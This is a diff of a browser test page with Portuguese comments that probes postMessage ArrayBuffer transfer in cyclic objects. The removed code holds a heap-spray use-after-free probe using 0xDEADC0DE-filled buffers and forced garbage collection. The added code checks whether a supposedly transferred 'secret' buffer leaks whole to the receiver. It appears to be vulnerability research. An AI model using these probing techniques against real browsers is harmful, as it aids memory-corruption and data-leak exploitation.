+  var receivedSecret = null;
+  var prevOnmessage = window.onmessage;
+  window.onmessage = function(e) {
+    var obj = e.data;
+    if(!obj || typeof obj !== 'object' || obj.id !== 'secret_transfer') {
+      if(prevOnmessage) prevOnmessage(e);
+      return;
+    }
+    receivedSecret = obj;
+    info('[onmessage] Objeto recebido: id=' + obj.id);
+    if(obj.secret instanceof ArrayBuffer) {
+      var recvView = new Uint32Array(obj.secret);
+      var leakedKey = [];
+      for(var i = 0; i < Math.min(8, recvView.length); i++) {
+        leakedKey.push('0x' + recvView[i].toString(16));
+      }
+      info('[onmessage] secret.byteLength=' + obj.secret.byteLength);
+      info('[onmessage] Conteudo: [' + leakedKey.join(', ') + ']');
+
+      var isOriginalKey = leakedKey[0] === '0x4b455931' && leakedKey[4] === '0xdeadc0de';
+      if(isOriginalKey && obj.secret.byteLength === 256) {
+        alerta('[onmessage] BUFFER SECRETO VAZOU COMPLETO!\n' +
+               'byteLength=' + obj.secret.byteLength + '\n' +
+               'Chave: [' + leakedKey.join(', ') + ']\n' +
+               'O remetente acreditava ter transferido (zerado) o buffer,\n' +
+               'mas o receptor recebeu todos os 256 bytes com os dados originais!\n' +
+               'IMPACTO: qualquer dado em ArrayBuffer dentro de objeto cíclico\n' +
+               'pode ser lido pelo receptor mesmo após "transfer" pelo remetente.');
+      }
+    }
+  };
 
   try {
-    postMessage(cyclic, '*', [buf]);
-    info('Não lançou. buf.byteLength=' + buf.byteLength + ' view.buffer.byteLength=' + view.buffer.byteLength);
-
-    if(buf.byteLength === 0) {
-      alerta('buf ZERADO após send. Tentando acessar via view local...');
-      try {
-        var v0 = view[0];
-        alerta('view[0] após transfer: ' + v0 + ' — view local sobre buffer transferido retornou valor!');
-      } catch(e2) {
-        ok('view[0] lançou após transfer: ' + e2.message);
-      }
-
-      // Alocar novo buffer do mesmo tamanho com valores controlados
-      // Se o motor reutilizou o endereço, a view pode ler o novo buffer
-      info('\nAlocando 500 buffers de ' + SIZE + ' bytes preenchidos com 0xDEADC0DE...');
-      var spray = [];
-      for(var j = 0; j < 500; j++) {
-        var nb = new ArrayBuffer(SIZE);
-        var nv = new Uint32Array(nb);
-        for(var k = 0; k < Math.min(nv.length, 100); k++) nv[k] = 0xDEADC0DE;
-        spray.push(nb);
-      }
-      forceGC();
-
-      // Tentar ler via view antiga
-      try {
-        var v0_after = view[0];
-        if(v0_after === 0xDEADC0DE) {
-          alerta('USE-AFTER-FREE CONFIRMADO: view[0]=0xDEADC0DE após spray!\n' +
-                 'A view local aponta para um novo buffer alocado no lugar do transferido!');
-        } else {
-          info('view[0] após spray: ' + v0_after);
-        }
-      } catch(e3) {
-        info('view[0] após spray lançou: ' + e3.message);
-      }
+    postMessage(cyclic, '*', [secretBuf]);
+    info('Enviado. secretBuf.byteLength=' + secretBuf.byteLength);
+    if(secretBuf.byteLength === 0) {
+      alerta('secretBuf ZERADO no remetente (byteLength=0).\n' +
+             'Remetente: acredita que dados foram transferidos e estão inacessíveis.\n' +
+             'Aguardando onmessage para verificar se receptor recebeu os dados...');
+    } else {
+      info('secretBuf.byteLength=' + secretBuf.byteLength + ' (não foi zerado — transfer falhou)');
     }
   } catch(e) {
     ok('postMessage lançou: ' + e.message);
   }
-  info('\nAguardando onmessage...');
+
+  info('\nAguardando onmessage com os dados do secretBuf...');
 }
 </script>
 </body>
